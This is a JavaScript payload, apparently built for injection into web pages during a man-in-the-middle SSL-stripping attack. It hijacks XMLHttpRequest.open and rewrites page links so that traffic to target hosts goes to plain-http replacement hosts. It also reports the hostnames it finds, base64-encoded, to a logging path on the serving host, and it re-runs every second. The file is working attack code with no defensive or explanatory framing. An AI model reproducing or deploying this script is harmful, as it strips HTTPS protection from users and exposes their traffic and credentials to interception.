var obf_var_callback_log = []

XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {
	for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
		obf_var_path = obf_var_url.replace(/.*(\/.*)\s*$/, "$1")
		obf_var_url = obf_var_url.replace(/^\s*http(s|):\/\//i, "").replace(/:433/, "").replace(/\/.*/, "").replace(/\s*$/, "")
		obf_var_regexp = new RegExp("^" + obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, "[a-z0-9\\-\\.]*[^\\.]") + "$", "i")
		if (obf_var_url.match(obf_var_regexp)) {
			obf_var_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, ""), "i")
			obf_var_replacement = obf_var_replacement_hosts[obf_var_i].replace(/^\*/, "")
			obf_var_url = obf_var_url.replace(obf_var_regexp, obf_var_replacement)
			obf_var_url = "http://" + obf_var_url + obf_var_path
		}
	}
	XMLHttpRequest.prototype.obf_open(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password)
}

function obf_func_callback(obf_var_data) {
	obf_var_req = new XMLHttpRequest()
	obf_var_req.obf_open("GET", "http://" + location.host + "/obf_path_ssl_log?" + obf_var_data, true)
	obf_var_req.send()
}

function obf_func_attack() {
	for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
		document.querySelectorAll("a").forEach(function(obf_var_a){
			obf_var_url = obf_var_a.href
			obf_var_path = obf_var_url.replace(/.*(\/.*)\s*$/, "$1")
			obf_var_url = obf_var_url.replace(/^\s*http(s|):\/\//i, "").replace(/:433/, "").replace(/\/.*/, "").replace(/\s*$/, "")
			obf_var_regexp = new RegExp("^" + obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, "[a-z0-9\\-\\.]*[^\\.]") + "$", "i")
			if (obf_var_url.match(obf_var_regexp)) {
				obf_var_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, ""), "i")
				obf_var_replacement = obf_var_replacement_hosts[obf_var_i].replace(/^\*/, "")
				obf_var_url = obf_var_url.replace(obf_var_regexp, obf_var_replacement)
				obf_var_a.href = "http://" + obf_var_url + obf_var_path
			}
		})
	}
	obf_var_urls = document.body.innerHTML.match(/http(s|)\:\/\/[a-z0-9\.\-]{4,61}\.[a-z]+(:80|443|)/ig)
	for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {
		obf_var_host = obf_var_urls[obf_var_i].replace(/http(s|)\:\/\//, "").replace(/:(80|443)$/, "")
		if (obf_var_callback_log.indexOf(obf_var_host) == -1) {
			obf_func_callback(btoa(obf_var_host))
			obf_var_callback_log.push(obf_var_host)
		}
	}
}

document.addEventListener("DOMContentLoaded", obf_func_attack)

setInterval(obf_func_attack, 1000)
